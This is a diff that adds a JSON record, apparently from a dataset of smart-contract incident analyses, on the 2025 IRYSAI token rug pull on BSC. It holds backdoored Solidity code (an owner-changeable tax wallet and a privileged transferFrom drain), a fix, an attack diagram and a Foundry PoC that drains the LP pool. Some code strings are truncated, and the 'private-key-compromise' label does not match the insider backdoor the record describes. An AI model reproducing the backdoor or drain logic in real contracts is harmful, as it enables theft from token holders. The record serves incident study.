@@ -1,0 +1,30 @@
+{
+ "id": "2025__2025-05-13_IRYSAI_Rugpull",
+ "source_file": "2025/2025-05-13_IRYSAI_Rugpull.md",
+ "title": "IRYSAI Token — Rug Pull Analysis via setTaxWallet Backdoor",
+ "date": "2025-05-13",
+ "protocol": "IRYSAI Token",
+ "chain": "BSC",
+ "loss_raw": "69,600 USD",
+ "loss_usd": null,
+ "root_cause": "Backdoor mechanism that changes the tax wallet via setTaxWallet() and then drains LP pool assets",
+ "attack_tx": null,
+ "vulnerable_contract": "0x746727FC8212ED49510a2cB81ab0486Ee6954444",
+ "classes": [
+  "private-key-compromise"
+ ],
+ "code_before": [
+  "❌ Vulnerable setTaxWallet: callable only by deployer but operates as a backdoor\ncontract IRYSAI {\n    address public taxWallet;\n    address public owner;\n\n    function setTaxWallet(address _wallet) external {\n        require(msg.sender == owner, \"Only owner\");\n        taxWallet = _wallet; //",
+  "❌ Tax wallet can be changed arbitrarily\n    }\n\n    function _transfer(address from, address to, uint256 amount) internal override {\n        uint256 tax = amount * TAX_RATE / 100;\n        //",
+  "❌ Tax is sent to taxWallet (which the deployer can change)\n        super._transfer(from, taxWallet, tax);\n        super._transfer(from, to, amount - tax);\n    }\n}\n\n// Or a direct drain mechanism via transferFrom\nfunction transferFrom(address from, address to, uint256 amount) external {\n    if (msg.sender == addr3) { //"
+ ],
+ "code_after": [
+  "✅ Correct design: fixed tax wallet or DAO governance change\ncontract IRYSAI {\n    address public immutable taxWallet; //",
+  "✅ Immutable address\n    constructor(address _taxWallet) {\n        taxWallet = _taxWallet;\n    }\n    // No setTaxWallet() function\n}"
+ ],
+ "steps": [],
+ "other_code": [
+  "Deployer (Insider)\n  │\n  ├─[Tx1: Backdoor]─► Call IRYSAI.setTaxWallet(addr3)\n  │                    └─► Change tax wallet to attacker-controlled address (addr3)\n  │\n  ├─[Tx2: Rug Pull]─► Call transferFrom(PancakePair, addr3, balance) from addr3\n  │                    └─► Move all IRYSAI tokens from LP pool to addr3\n  │                    └─► Obtain BNB via PancakePair.burn() or swap\n  │\n  └─[Result]─► ~69,600 USD stolen",
+  "contract ContractTest is Test {\n    function testPoC() public {\n        // [Tx1] Change tax wallet via setTaxWallet backdoor\n        vm.startPrank(addr3); // Simulate deployer address\n        IIRYSAI(IRYSAI).setTaxWallet(addr3); // Tax wallet → addr3\n\n        // [Tx2] Drain IRYSAI tokens from LP pool\n        // Method 1: Directly move tokens from LP via transferFrom\n        IIRYSAI(IRYSAI).transferFrom(\n            PancakePair,   // from: LP pool\n            addr3,         // to: attacker\n            IIRYSAI(IRYSAI).balanceOf(PancakePair)\n        );\n\n        // Method 2: Or direct drain via burn() function\n        // IAttacker(addr3).burn() call\n\n        vm.stopPrank();\n\n        // Swap to BNB\n        // Swap via PancakeRouter...\n    }\n}\n\n// burn function from the actual attack contract\nco"
+ ]
+}
